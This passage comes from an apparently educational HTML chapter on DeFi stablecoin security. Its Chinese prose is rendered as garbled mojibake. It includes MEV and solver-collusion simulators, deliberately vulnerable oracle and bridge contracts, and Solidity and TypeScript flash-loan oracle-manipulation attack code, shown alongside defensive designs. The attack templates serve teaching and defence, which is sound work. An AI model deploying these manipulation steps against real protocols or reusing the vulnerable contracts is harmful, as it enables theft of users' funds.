    def identify_mev_opportunities(self, block: Dict) -> float:
        """è¯†åˆ«åŒºå—ä¸­çš„MEVæœºä¼š"""
        mev = 0
        
        # å¥—åˆ©æœºä¼š
        for tx in block['transactions']:
            if tx['type'] == 'swap':
                # æ£€æŸ¥ä»·æ ¼å·®å¼‚
                price_diff = abs(tx['execution_price'] - tx['market_price'])
                mev += price_diff * tx['amount'] * 0.8  # 80%å¯æ•è·
        
        # æ¸…ç®—æœºä¼š
        liquidations = [tx for tx in block['transactions'] 
                       if tx['type'] == 'liquidation']
        mev += sum(liq['penalty'] * 0.5 for liq in liquidations)
        
        return mev

# Intent-basedç³»ç»Ÿæ”»å‡»æ¨¡æ‹Ÿ
class IntentBasedAttackSimulator:
    """æ¨¡æ‹ŸIntent-basedæ¶æ„ä¸‹çš„æ”»å‡»"""
    
    def __init__(self):
        self.solvers = {}
        self.intent_pool = []
        
    def simulate_solver_collusion(self,
                                intents: List[Dict],
                                honest_solvers: int,
                                colluding_solvers: int) -> Dict:
        """æ¨¡æ‹Ÿæ±‚è§£å™¨ä¸²è°‹æ”»å‡»"""
        
        # æ­£å¸¸ç«äº‰æƒ…å†µä¸‹çš„æ‰§è¡Œè´¨é‡
        competitive_quality = self.calculate_competitive_execution(
            intents, honest_solvers + colluding_solvers
        )
        
        # ä¸²è°‹æƒ…å†µä¸‹çš„æ‰§è¡Œè´¨é‡
        collusion_quality = self.calculate_collusion_execution(
            intents, colluding_solvers, honest_solvers
        )
        
        # ç”¨æˆ·æŸå¤±
        user_loss = competitive_quality['user_surplus'] - \
                   collusion_quality['user_surplus']
        
        # ä¸²è°‹è€…é¢å¤–æ”¶ç›Š
        collusion_profit = collusion_quality['solver_profit'] - \
                          competitive_quality['solver_profit']
        
        return {
            'user_loss_per_trade': user_loss / len(intents),
            'collusion_profit_per_solver': collusion_profit / colluding_solvers,
            'execution_quality_degradation': 
                (competitive_quality['execution_score'] - 
                 collusion_quality['execution_score']) / 
                competitive_quality['execution_score'],
            'detection_difficulty': self.calculate_detection_difficulty(
                colluding_solvers, honest_solvers
            )
        }
    
    def simulate_intent_privacy_attack(self,
                                     intent: Dict,
                                     market_impact_model: callable) -> Dict:
        """æ¨¡æ‹Ÿæ„å›¾éšç§æ”»å‡»"""
        
        # æ­£å¸¸æ‰§è¡Œ
        normal_execution = {
            'price': intent['expected_price'],
            'slippage': intent['max_slippage']
        }
        
        # æ”»å‡»è€…æå‰çŸ¥é“æ„å›¾åçš„æ“ä½œ
        # 1. æå‰ä¹°å…¥
        frontrun_amount = intent['amount'] * 0.3  # æ”»å‡»è€…èµ„é‡‘é™åˆ¶
        price_impact = market_impact_model(frontrun_amount)
        
        # 2. ç”¨æˆ·æ‰§è¡Œï¼ˆä»·æ ¼å·²è¢«æ¨é«˜ï¼‰
        user_execution_price = intent['expected_price'] * (1 + price_impact)
        
        # 3. æ”»å‡»è€…å–å‡ºè·åˆ©
        attacker_profit = frontrun_amount * price_impact * 0.7  # æ‰£é™¤æˆæœ¬
        
        return {
            'user_additional_cost': (user_execution_price - normal_execution['price']) * intent['amount'],
            'attacker_profit': attacker_profit,
            'price_impact': price_impact,
            'detection_signals': [
                'unusual_volume_before_large_trade',
                'correlated_trades_across_venues',
                'timing_analysis_anomaly'
            ]
        }

# ä½¿ç”¨ç¤ºä¾‹
mev_sim = MEVBoostSimulator()

# æ¨¡æ‹ŸBuilderæ‹å–
transactions = [
    {'type': 'swap', 'amount': 1000000, 'gas': 200000, 'execution_price': 1.01, 'market_price': 1.0},
    {'type': 'liquidation', 'penalty': 50000, 'gas': 300000},
    # ... æ›´å¤šäº¤æ˜“
]

builder_strategies = {
    'builder_1': {'profit_margin': 0.1, 'specialization': 'arbitrage'},
    'builder_2': {'profit_margin': 0.05, 'specialization': 'liquidations'},
    'builder_3': {'profit_margin': 0.15, 'specialization': 'general'}
}

auction_result = mev_sim.simulate_builder_auction(transactions, builder_strategies)
print(f"è·èƒœBuilder: {auction_result['winner']}")
print(f"MEVæå–: ${auction_result['winning_bundle']['mev_extracted']:,.2f}")</code></pre>
                </div>
            </div>
            
            <h5>å†è´¨æŠ¼é£é™©ï¼ˆRestaking Riskï¼‰ä¸LRTæ”»å‡»</h5>
            <p>2024å¹´æœ€é‡è¦çš„æ–°å…´é£é™©é¢†åŸŸã€‚æµåŠ¨æ€§å†è´¨æŠ¼ä»£å¸ï¼ˆLRTsï¼‰å¼•å…¥å¤šå±‚é£é™©å åŠ ï¼š</p>
            
            <div class="warning-box">
                <h6>LRTä½œä¸ºç¨³å®šå¸æŠµæŠ¼å“çš„é£é™©</h6>
                <ul>
                    <li><strong>åŸºç¡€å±‚é£é™©</strong>ï¼šåº•å±‚ETHè´¨æŠ¼çš„ç½šæ²¡é£é™©</li>
                    <li><strong>AVSé£é™©</strong>ï¼šEigenLayerä¸»åŠ¨éªŒè¯æœåŠ¡çš„ç‰¹å®šé£é™©</li>
                    <li><strong>åè®®é£é™©</strong>ï¼šLRTåè®®æœ¬èº«çš„æ™ºèƒ½åˆçº¦é£é™©</li>
                    <li><strong>æµåŠ¨æ€§é£é™©</strong>ï¼šLRT/ETHè„±é”šé£é™©</li>
                </ul>
                
                <p><strong>æ”»å‡»å‘é‡</strong>ï¼šæ”»å‡»è€…å¯é€šè¿‡æ”»å‡»æŸä¸ªAVSè§¦å‘å¤§è§„æ¨¡ç½šæ²¡ï¼Œå¯¼è‡´LRTä»·å€¼æš´è·Œï¼Œè¿›è€Œè§¦å‘ä½¿ç”¨LRTä½œä¸ºæŠµæŠ¼å“çš„ç¨³å®šå¸ç³»ç»Ÿè¿ç¯æ¸…ç®—ã€‚</p>
            </div>
        </div>
        
        <div class="practice-section">
            <h4>10.2.1 é—ªç”µè´·æ”»å‡»è¿›é˜¶</h4>
            
            <div class="warning-box">
                <p><strong>é—ªç”µè´·çš„æœ¬è´¨</strong>ï¼šé—ªç”µè´·æœ¬èº«ä¸æ˜¯æ¼æ´ï¼Œè€Œæ˜¯"åŸå­æ€§"çš„èµ„æœ¬æ”¾å¤§å™¨ã€‚æ ¸å¿ƒé—®é¢˜æ˜¯å®ƒåˆ©ç”¨äº†"æ£€æŸ¥-ç”Ÿæ•ˆ"ç«äº‰æ¡ä»¶ï¼ˆCheck-Effect Race Conditionï¼‰ï¼Œå°¤å…¶æ˜¯åœ¨é¢„è¨€æœºæ›´æ–°æœºåˆ¶ä¸Šã€‚</p>
            </div>
            
            <h5>å®è·µç¤ºä¾‹ï¼šæœ‰æ¼æ´çš„é¢„è¨€æœºåˆçº¦</h5>
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// æœ‰æ¼æ´çš„é¢„è¨€æœºåˆçº¦ï¼ˆä»…ä¾›æ•™å­¦ä½¿ç”¨ï¼‰
contract VulnerableOracle {
    address public priceSource;  // å•ä¸€DEXä½œä¸ºä»·æ ¼æº
    uint256 public lastPrice;
    uint256 public lastUpdateTime;
    
    constructor(address _priceSource) {
        priceSource = _priceSource;
    }
    
    // æ¼æ´ï¼šä½¿ç”¨å•ä¸€DEXçš„ç°è´§ä»·æ ¼
    function updatePrice(address token0, address token1) external {
        IUniswapV2Pair pair = IUniswapV2Pair(priceSource);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        
        // ç›´æ¥ä½¿ç”¨å½“å‰å‚¨å¤‡é‡è®¡ç®—ä»·æ ¼
        if (pair.token0() == token0) {
            lastPrice = (uint256(reserve1) * 1e18) / uint256(reserve0);
        } else {
            lastPrice = (uint256(reserve0) * 1e18) / uint256(reserve1);
        }
        
        lastUpdateTime = block.timestamp;
    }
    
    function getPrice() external view returns (uint256) {
        require(block.timestamp - lastUpdateTime < 3600, "Price too old");
        return lastPrice;
    }
}

// æ”»å‡»åˆçº¦
contract OracleManipulationAttack {
    IFlashLoanProvider constant AAVE = IFlashLoanProvider(0x...);
    IUniswapV2Router constant ROUTER = IUniswapV2Router(0x...);
    VulnerableOracle constant ORACLE = VulnerableOracle(0x...);
    IVulnerableProtocol constant TARGET = IVulnerableProtocol(0x...);
    
    function executeAttack() external {
        // æ­¥éª¤1: å€Ÿå…¥1000ä¸‡USDC
        uint256 loanAmount = 10_000_000 * 1e6;
        AAVE.flashLoan(address(this), address(USDC), loanAmount, "");
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // æ­¥éª¤2: åœ¨ä½œä¸ºä»·æ ¼æºçš„DEXä¸Šå¤§é‡ä¹°å…¥ç›®æ ‡ä»£å¸
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(TARGET_TOKEN);
        
        // ä½¿ç”¨5ç™¾ä¸‡USDCä¹°å…¥ï¼Œå¤§å¹…æ¨é«˜ä»·æ ¼
        uint256 manipulationAmount = 5_000_000 * 1e6;
        USDC.approve(address(ROUTER), manipulationAmount);
        
        uint256[] memory amounts = ROUTER.swapExactTokensForTokens(
            manipulationAmount,
            0,  // æ¥å—ä»»ä½•æ•°é‡çš„è¾“å‡º
            path,
            address(this),
            block.timestamp
        );
        
        uint256 tokenReceived = amounts[1];
        
        // æ­¥éª¤3: è§¦å‘é¢„è¨€æœºæ›´æ–°
        ORACLE.updatePrice(address(USDC), address(TARGET_TOKEN));
        
        // æ­¥éª¤4: åˆ©ç”¨è¢«æ“çºµçš„ä»·æ ¼
        // ä¾‹å¦‚ï¼šä»¥è™šé«˜ä»·æ ¼ä½œä¸ºæŠµæŠ¼å“å€Ÿå‡ºæ›´å¤šèµ„é‡‘
        TARGET_TOKEN.approve(address(TARGET), tokenReceived);
        TARGET.deposit(tokenReceived);
        
        // å€Ÿå‡ºæœ€å¤§å¯èƒ½çš„USDCï¼ˆåŸºäºè¢«æ“çºµçš„é«˜ä»·æ ¼ï¼‰
        uint256 borrowAmount = TARGET.calculateMaxBorrow(address(this));
        TARGET.borrow(address(USDC), borrowAmount);
        
        // æ­¥éª¤5: åœ¨DEXä¸Šå–å›ï¼Œæ¢å¤ä»·æ ¼
        path[0] = address(TARGET_TOKEN);
        path[1] = address(USDC);
        
        TARGET_TOKEN.approve(address(ROUTER), tokenReceived);
        ROUTER.swapExactTokensForTokens(
            tokenReceived,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        // æ­¥éª¤6: å¿è¿˜é—ªç”µè´·
        uint256 totalDebt = amount + premium;
        USDC.approve(address(AAVE), totalDebt);
        
        // åˆ©æ¶¦ = å€Ÿå‡ºçš„é¢å¤–USDC - é—ªç”µè´·è´¹ç”¨ - äº¤æ˜“æŸè€—
        uint256 profit = USDC.balanceOf(address(this)) - totalDebt;
        
        return true;
    }
}</code></pre>
                </div>
            </div>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// å¤æ‚é—ªç”µè´·æ”»å‡»ç¤ºä¾‹
contract FlashLoanAttackVector {
    
    // æ”»å‡»æ¡ˆä¾‹ï¼šåˆ©ç”¨é—ªç”µè´·æ“çºµé¢„è¨€æœºä»·æ ¼
    function executeOracleManipulation(
        address flashLoanProvider,
        address targetToken,
        address stablecoin,
        uint256 loanAmount
    ) external {
        // æ­¥éª¤1ï¼šå€Ÿå…¥å¤§é‡èµ„é‡‘
        IFlashLoanProvider(flashLoanProvider).flashLoan(
            loanAmount,
            abi.encode(targetToken, stablecoin)
        );
    }
    
    function onFlashLoanReceived(
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {
        (address targetToken, address stablecoin) = abi.decode(
            data, 
            (address, address)
        );
        
        // æ­¥éª¤2ï¼šä½¿ç”¨å€Ÿæ¥çš„èµ„é‡‘æ“çºµä»·æ ¼
        // åœ¨ä½æµåŠ¨æ€§æ± ä¸­å¤§é‡ä¹°å…¥ï¼Œæ¨é«˜ä»·æ ¼
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            amount / 2,
            0,
            getPath(stablecoin, targetToken),
            address(this),
            block.timestamp
        );
        
        // æ­¥éª¤3ï¼šåˆ©ç”¨è¢«æ“çºµçš„ä»·æ ¼
        // ä¾‹å¦‚ï¼šä»¥è™šé«˜ä»·æ ¼ä½œä¸ºæŠµæŠ¼å“å€Ÿå‡ºæ›´å¤šèµ„é‡‘
        ILendingProtocol(LENDING).deposit(targetToken, myBalance);
        uint256 borrowAmount = ILendingProtocol(LENDING).borrow(
            stablecoin,
            calculateMaxBorrow() // åŸºäºè¢«æ“çºµçš„ä»·æ ¼
        );
        
        // æ­¥éª¤4ï¼šå¹³ä»“å¹¶è·åˆ©
        // å–å‡ºä¹‹å‰ä¹°å…¥çš„ä»£å¸ï¼Œä»·æ ¼å›è½
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            targetBalance,
            0,
            getPath(targetToken, stablecoin),
            address(this),
            block.timestamp
        );
        
        // æ­¥éª¤5ï¼šå¿è¿˜é—ªç”µè´·
        IERC20(stablecoin).transfer(
            flashLoanProvider,
            amount + fee
        );
        
        // åˆ©æ¶¦ = å€Ÿå‡ºçš„é¢å¤–èµ„é‡‘ - é—ªç”µè´·è´¹ç”¨ - äº¤æ˜“æŸè€—
    }
}

// é˜²å¾¡æœºåˆ¶ï¼šå»¶è¿Ÿä»·æ ¼æ›´æ–°
contract PriceOracleDefense {
    uint256 public constant PRICE_DELAY = 15 minutes;
    uint256 public constant MAX_PRICE_CHANGE = 1000; // 10%
    
    struct PriceData {
        uint256 price;
        uint256 timestamp;
        uint256 cumulativePrice;
        uint256 priceCount;
    }
    
    mapping(address => PriceData) public priceFeeds;
    
    function updatePrice(address token, uint256 newPrice) external {
        PriceData storage data = priceFeeds[token];
        
        // æ£€æŸ¥ä»·æ ¼å˜åŒ–å¹…åº¦
        if (data.price > 0) {
            uint256 priceChange = newPrice > data.price ?
                ((newPrice - data.price) * 10000) / data.price :
                ((data.price - newPrice) * 10000) / data.price;
            
            require(priceChange <= MAX_PRICE_CHANGE, "Price change too large");
        }
        
        // ä½¿ç”¨TWAPï¼ˆæ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼‰
        data.cumulativePrice += newPrice;
        data.priceCount++;
        
        // å»¶è¿Ÿä»·æ ¼ç”Ÿæ•ˆ
        if (block.timestamp >= data.timestamp + PRICE_DELAY) {
            data.price = data.cumulativePrice / data.priceCount;
            data.timestamp = block.timestamp;
            data.cumulativePrice = 0;
            data.priceCount = 0;
        }
    }
}</code></pre>
                </div>
            </div>

            <h4>10.2.2 MEVæ¼”è¿›ï¼šPBSä¸MEV-Boost</h4>
        
        <div class="info-box">
            <p><strong>Proposer-Builder Separation (PBS)</strong>ï¼šä»¥å¤ªåŠåˆå¹¶åçš„æ ¸å¿ƒæ¶æ„ï¼Œå°†åŒºå—æè®®è€…ï¼ˆProposerï¼‰å’Œæ„å»ºè€…ï¼ˆBuilderï¼‰åˆ†ç¦»ï¼Œä»æ ¹æœ¬ä¸Šæ”¹å˜äº†MEVçš„æå–æ–¹å¼ã€‚</p>
        </div>
        
        <div class="code-block">
            <div class="code-header">
                TypeScript ä»£ç  <span class="toggle-icon">â–¼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-typescript">// MEV-Boostæ¶æ„ä¸‹çš„æ”»å‡»æ¨¡å‹
interface MEVBoostBundle {
    transactions: Transaction[];
    blockNumber: number;
    minTimestamp?: number;
    maxTimestamp?: number;
    revertingTxHashes?: string[];
}

class AdvancedMEVAttack {
    private flashbotsRelay: string = "https://relay.flashbots.net";
    private builderEndpoints: Map<string, string>;
    
    constructor() {
        // å¤šä¸ªBuilderç«¯ç‚¹ï¼Œæé«˜æˆåŠŸç‡
        this.builderEndpoints = new Map([
            ['flashbots', 'https://relay.flashbots.net'],
            ['bloxroute', 'https://bloxroute.ethical.blxrbdn.com'],
            ['blocknative', 'https://api.blocknative.com/v1']
        ]);
    }
    
    async executeOracleManipulationWithMEV(
        targetProtocol: string,
        manipulationAmount: bigint
    ): Promise<boolean> {
        // æ­¥éª¤1ï¼šæ„å»ºæ”»å‡»äº¤æ˜“åºåˆ—
        const bundle: MEVBoostBundle = {
            transactions: [],
            blockNumber: await this.getCurrentBlockNumber() + 1
        };
        
        // äº¤æ˜“ 1: é—ªç”µè´·
        const flashLoanTx = await this.buildFlashLoanTransaction(
            manipulationAmount
        );
        bundle.transactions.push(flashLoanTx);
        
        // äº¤æ˜“ 2: æ“çºµé¢„è¨€æœºä»·æ ¼
        const manipulateTx = await this.buildPriceManipulationTx(
            targetProtocol,
            manipulationAmount
        );
        bundle.transactions.push(manipulateTx);
        
        // äº¤æ˜“ 3: åˆ©ç”¨è¢«æ“çºµçš„ä»·æ ¼
        const exploitTx = await this.buildExploitTransaction(
            targetProtocol
        );
        bundle.transactions.push(exploitTx);
        
        // äº¤æ˜“ 4: è¿˜åŸå¸‚åœºå¹¶å¿è¿˜é—ªç”µè´·
        const restoreTx = await this.buildRestoreTransaction();
        bundle.transactions.push(restoreTx);
        
        // æ­¥éª¤2ï¼šè®¡ç®—æœ€ä¼˜è´¿èµ‚
        const expectedProfit = await this.calculateExpectedProfit(bundle);
        const optimalBribe = this.calculateOptimalBribe(
            expectedProfit,
            await this.getCompetitionLevel()
        );
        
        // æ­¥éª¤3ï¼šæäº¤ç»™å¤šä¸ªBuilder
        const submissions = await Promise.allSettled(
            Array.from(this.builderEndpoints.entries()).map(
                async ([name, endpoint]) => {
                    return this.submitBundleToBuilder(
                        bundle,
                        endpoint,
                        optimalBribe
                    );
                }
            )
        );
        
        // æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•æˆåŠŸæäº¤
        return submissions.some(result => 
            result.status === 'fulfilled' && result.value.included
        );
    }
    
    private calculateOptimalBribe(
        expectedProfit: bigint,
        competitionLevel: number
    ): bigint {
        // åŸºäºç«äº‰ç¨‹åº¦çš„åŠ¨æ€è´¿èµ‚ç­–ç•¥
        // é«˜ç«äº‰ï¼šè´¿èµ‚é«˜è¾¾åˆ©æ¶¦çš„90%
        // ä½ç«äº‰ï¼šåªè´¿èµ‚åˆ©æ¶¦çš„50%
        const bribePercentage = 50 + (competitionLevel * 40);
        return (expectedProfit * BigInt(bribePercentage)) / 100n;
    }
    
    private async getCompetitionLevel(): Promise<number> {
        // åˆ†æmempoolå’Œæœ€è¿‘åŒºå—çš„MEVæ´»åŠ¨
        const recentBlocks = await this.getRecentBlocks(10);
        const mevActivity = recentBlocks.map(block => 
            this.analyzeMEVActivity(block)
        );
        
        // è¿”å›0-1ä¹‹é—´çš„ç«äº‰ç¨‹åº¦
        return Math.min(1, mevActivity.reduce((a, b) => a + b) / 10);
    }
}</code></pre>
            </div>
        </div>
        
        <h4>10.2.3 è·¨é“¾æ¡¥æ”»å‡»ä¸ç¨³å®šå¸é£é™©</h4>
        
        <div class="theory-section">
            <p>ç¨³å®šå¸çš„è·¨é“¾æ¡¥æ¥ç‰ˆæœ¬æˆä¸ºæ–°çš„æ”»å‡»å‘é‡ã€‚æ”»å‡»è€…é€šè¿‡æ”»å‡»æœ€è–„å¼±çš„è·¨é“¾æ¡¥ï¼Œå¯ä»¥å‡­ç©ºé“¸é€ "åŒ…è£…"ç¨³å®šå¸ï¼Œç¨€é‡Šå…¶ä»·å€¼æˆ–å¯¼è‡´ç‰¹å®šé“¾ä¸Šçš„ç‰ˆæœ¬è„±é”šã€‚</p>
            
            <h5>è·¨é“¾æ¡¥æ”»å‡»ç±»å‹</h5>
            <ul>
                <li><strong>éªŒè¯å™¨ä¸²è°‹</strong>ï¼šå¤šç­¾éªŒè¯å™¨åˆè°‹é“¸é€ å‡ä»£å¸</li>
                <li><strong>é‡å…¥æ”»å‡»</strong>ï¼šåˆ©ç”¨è·¨é“¾æ¶ˆæ¯çš„å¼‚æ­¥æ€§</li>
                <li><strong>æ—¶é—´å·®æ”»å‡»</strong>ï¼šåˆ©ç”¨ä¸åŒé“¾çš„ç¡®è®¤æ—¶é—´å·®å¼‚</li>
                <li><strong>é¢„è¨€æœºæ“çºµ</strong>ï¼šæ“çºµæ¡¥æ¥åè®®çš„ä»·æ ¼é¢„è¨€æœº</li>
            </ul>
            
            <div class="warning-box">
                <h6>2024å¹´è·¨é“¾æ¡¥é£é™©æ–°åŠ¨å‘</h6>
                <ul>
                    <li><strong>åŸç”ŸvsåŒ…è£…ç‰ˆæœ¬è„±é’©</strong>ï¼šå¦‚wUSDC vs USDC.eä»·æ ¼å·®å¼‚</li>
                    <li><strong>æµåŠ¨æ€§åˆ†æ•£åŒ–</strong>ï¼šåŒä¸€ç¨³å®šå¸åœ¨å¤šé“¾ä¸Šçš„æµåŠ¨æ€§ç¢ç‰‡åŒ–</li>
                    <li><strong>çº§è”è„±é”šé£é™©</strong>ï¼šä¸€æ¡é“¾ä¸Šçš„é—®é¢˜ä¼ æ’­åˆ°å…¶ä»–é“¾</li>
                    <li><strong>æ¡¥æ¥åè®®ä¾èµ–</strong>ï¼šå¯¹ç‰¹å®šæ¡¥æ¥åè®®çš„è¿‡åº¦ä¾èµ–</li>
                </ul>
            </div>
        </div>
        
        <div class="code-section">
            <div class="code-header" onclick="toggleCode(this)">
                <span>â–¶ Solidity: è·¨é“¾æ¡¥æ”»å‡»å‘é‡åˆ†æ</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// æœ‰æ¼æ´çš„è·¨é“¾æ¡¥åˆçº¦ç¤ºä¾‹
contract VulnerableBridge {
    mapping(uint256 => bool) public processedNonces;
    mapping(address => uint256) public balances;
    
    // æ¼æ´1ï¼šç¼ºä¹ä¸¥æ ¼çš„nonceç®¡ç†
    function mint(
        address recipient,
        uint256 amount,
        uint256 nonce,
        bytes[] memory signatures
    ) external {
        require(!processedNonces[nonce], "Already processed");
        require(verifySignatures(recipient, amount, nonce, signatures), "Invalid signatures");
        
        processedNonces[nonce] = true;
        _mint(recipient, amount);
    }
    
    // æ¼æ´2ï¼šæ—¶é—´çª—å£æ”»å‡»
    function burnAndBridge(
        uint256 amount,
        uint256 targetChain,
        address targetAddress
    ) external {
        // çƒ§æ¯ä»£å¸
        _burn(msg.sender, amount);
        
        // å‘é€è·¨é“¾æ¶ˆæ¯ï¼ˆå¼‚æ­¥ï¼‰
        emit BridgeRequest(
            block.chainid,
            targetChain,
            msg.sender,
            targetAddress,
            amount,
            block.timestamp
        );
        
        // æ¼æ´ï¼šæ²¡æœ‰é”å®šæœŸï¼Œå¯èƒ½åœ¨ç›®æ ‡é“¾ç¡®è®¤å‰é‡ç»„
    }
}

// å®‰å…¨çš„è·¨é“¾æ¡¥è®¾è®¡
contract SecureBridge {
    uint256 constant CONFIRMATION_BLOCKS = 100;
    uint256 constant BRIDGE_DELAY = 1 hours;
    
    struct BridgeRequest {
        address user;
        uint256 amount;
        uint256 targetChain;
        address targetAddress;
        uint256 timestamp;
        uint256 blockNumber;
        bool processed;
    }
    
    mapping(bytes32 => BridgeRequest) public requests;
    mapping(uint256 => mapping(uint256 => bool)) public processedNonces;
    
    // å¤šé‡éªŒè¯æœºåˆ¶
    modifier multiValidation(
        bytes32 requestId,
        bytes[] memory oracleSignatures,
        bytes[] memory validatorSignatures
    ) {
        require(
            verifyOracles(requestId, oracleSignatures) &&
            verifyValidators(requestId, validatorSignatures),
            "Invalid validation"
        );
        _;
    }
    
    // æ—¶é—´é”å®šå’Œå¤šé‡ç¡®è®¤
    function initiateBridge(
        uint256 amount,
        uint256 targetChain,
        address targetAddress
    ) external returns (bytes32 requestId) {
        // é”å®šä»£å¸è€Œéç«‹å³çƒ§æ¯
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        
        requestId = keccak256(
            abi.encodePacked(
                msg.sender,
                amount,
                targetChain,
                targetAddress,
                block.timestamp,
                block.number
            )
        );
        
        requests[requestId] = BridgeRequest({
            user: msg.sender,
            amount: amount,
            targetChain: targetChain,
            targetAddress: targetAddress,
            timestamp: block.timestamp,
            blockNumber: block.number,
            processed: false
        });
        
        emit BridgeInitiated(requestId, msg.sender, amount, targetChain);
    }
    
    // å®Œæˆæ¡¥æ¥ï¼ˆéœ€è¦å¤šé‡éªŒè¯å’Œæ—¶é—´å»¶è¿Ÿï¼‰
    function completeBridge(
        bytes32 requestId,
        bytes[] memory oracleSignatures,
        bytes[] memory validatorSignatures
    ) external multiValidation(requestId, oracleSignatures, validatorSignatures) {
        BridgeRequest storage request = requests[requestId];
        
        require(!request.processed, "Already processed");
        require(
            block.number >= request.blockNumber + CONFIRMATION_BLOCKS,
            "Insufficient confirmations"
        );
        require(
            block.timestamp >= request.timestamp + BRIDGE_DELAY,
            "Bridge delay not met"
        );
        
        request.processed = true;
        
        // çƒ§æ¯é”å®šçš„ä»£å¸
        IERC20(token).burn(request.amount);
        
        emit BridgeCompleted(requestId, request.targetChain);
    }
}</code></pre>
            </div>
        </div>
        
        <div class="code-section">
            <div class="code-header" onclick="toggleCode(this)">
                <span>â–¶ Python: è·¨é“¾æ¡¥é£é™©å»ºæ¨¡</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">import numpy as np
from typing import Dict, List
import networkx as nx

class CrossChainRiskModel:
    """è·¨é“¾æ¡¥é£é™©ä¼ æ’­æ¨¡å‹"""
    
    def __init__(self):
        self.chains = {}
        self.bridges = {}
        self.liquidity_distribution = {}
        
    def model_bridge_attack_impact(self,
                                 attack_bridge: str,
                                 attack_amount: float,
                                 chain_liquidity: Dict[str, float]) -> Dict:
        """æ¨¡æ‹Ÿæ¡¥æ¥æ”»å‡»å¯¹ç¨³å®šå¸ç³»ç»Ÿçš„å½±å“"""
        
        # æ„å»ºé“¾é—´ä¾èµ–å›¾
        G = nx.DiGraph()
        for chain, liquidity in chain_liquidity.items():
            G.add_node(chain, liquidity=liquidity)
        
        # æ·»åŠ æ¡¥æ¥å…³ç³»
        for bridge_id, bridge_info in self.bridges.items():
            G.add_edge(
                bridge_info['source_chain'],
                bridge_info['target_chain'],
                bridge=bridge_id,
                capacity=bridge_info['daily_volume']
            )
        
        # æ¨¡æ‹Ÿæ”»å‡»å½±å“ä¼ æ’­
        affected_chains = {attack_bridge.split('_')[0]: attack_amount}
        propagation_rounds = []
        
        for round in range(10):  # æœ€å¤š10è½®ä¼ æ’­
            new_affected = {}
            
            for chain, impact in affected_chains.items():
                # è®¡ç®—å¯¹ç›¸é‚»é“¾çš„å½±å“
                for neighbor in G.neighbors(chain):
                    bridge_capacity = G[chain][neighbor]['capacity']
                    liquidity_ratio = G.nodes[neighbor]['liquidity'] / G.nodes[chain]['liquidity']
                    
                    # å½±å“ä¼ æ’­å…¬å¼
                    propagated_impact = impact * min(1, bridge_capacity / G.nodes[chain]['liquidity']) * (1 - liquidity_ratio)
                    
                    if neighbor not in new_affected:
                        new_affected[neighbor] = 0
                    new_affected[neighbor] += propagated_impact * 0.7  # è¡°å‡å› å­
            
            if not new_affected:
                break
                
            affected_chains.update(new_affected)
            propagation_rounds.append(new_affected.copy())
        
        return {
            'directly_affected': attack_bridge.split('_')[0],
            'total_chains_affected': len(affected_chains),
            'total_value_at_risk': sum(affected_chains.values()),
            'propagation_path': propagation_rounds,
            'systemic_risk_score': self.calculate_systemic_risk(affected_chains, chain_liquidity)
        }
    
    def analyze_wrapped_token_risks(self,
                                  native_chain: str,
                                  wrapped_versions: List[Dict]) -> Dict:
        """åˆ†æåŒ…è£…ç‰ˆæœ¬ç¨³å®šå¸çš„é£é™©"""
        
        risks = {}
        
        for wrapped in wrapped_versions:
            # æµåŠ¨æ€§é£é™©
            liquidity_risk = 1 - (wrapped['liquidity'] / wrapped['total_supply'])
            
            # æ¡¥æ¥åè®®é£é™©
            bridge_concentration = max(wrapped['bridge_volumes'].values()) / sum(wrapped['bridge_volumes'].values())
            
            # ä»·æ ¼åç¦»é£é™©
            historical_depeg = np.std(wrapped['price_history'])
            
            # ç»¼åˆé£é™©è¯„åˆ†
            risk_score = (
                liquidity_risk * 0.3 +
                bridge_concentration * 0.4 +
                historical_depeg * 0.3
            )
            
            risks[wrapped['symbol']] = {
                'risk_score': risk_score,
                'liquidity_risk': liquidity_risk,
                'bridge_concentration': bridge_concentration,
                'depeg_volatility': historical_depeg,
                'recommended_exposure_limit': self.calculate_exposure_limit(risk_score)
            }
        
        return risks
    
    def simulate_cascade_failure(self,
                               initial_failure: str,
                               network_state: Dict) -> List[Dict]:
        """æ¨¡æ‹Ÿçº§è”å¤±è´¥åœºæ™¯"""
        
        timeline = []
        failed_bridges = {initial_failure}
        current_state = network_state.copy()
        
        time = 0
        while time < 100:  # 100ä¸ªæ—¶é—´æ­¥
            new_failures = set()
            
            for bridge_id, bridge in self.bridges.items():
                if bridge_id in failed_bridges:
                    continue
                
                # æ£€æŸ¥æ¡¥æ¥å‹åŠ›
                stress = self.calculate_bridge_stress(
                    bridge_id,
                    failed_bridges,
                    current_state
                )
                
                # å¤±è´¥æ¦‚ç‡
                failure_prob = 1 - np.exp(-stress * 0.1)
                
                if np.random.random() < failure_prob:
                    new_failures.add(bridge_id)
            
            if new_failures:
                failed_bridges.update(new_failures)
                timeline.append({
                    'time': time,
                    'new_failures': list(new_failures),
                    'total_failed': len(failed_bridges),
                    'system_health': self.calculate_system_health(failed_bridges)
                })
            
            time += 1
            
            # æ›´æ–°ç³»ç»ŸçŠ¶æ€
            current_state = self.update_state_after_failures(
                current_state,
                failed_bridges
            )
            
            # æ£€æŸ¥æ˜¯å¦å®Œå…¨å´©æºƒ
            if self.calculate_system_health(failed_bridges) < 0.1:
                break
        
        return timeline

# ä½¿ç”¨ç¤ºä¾‹
risk_model = CrossChainRiskModel()

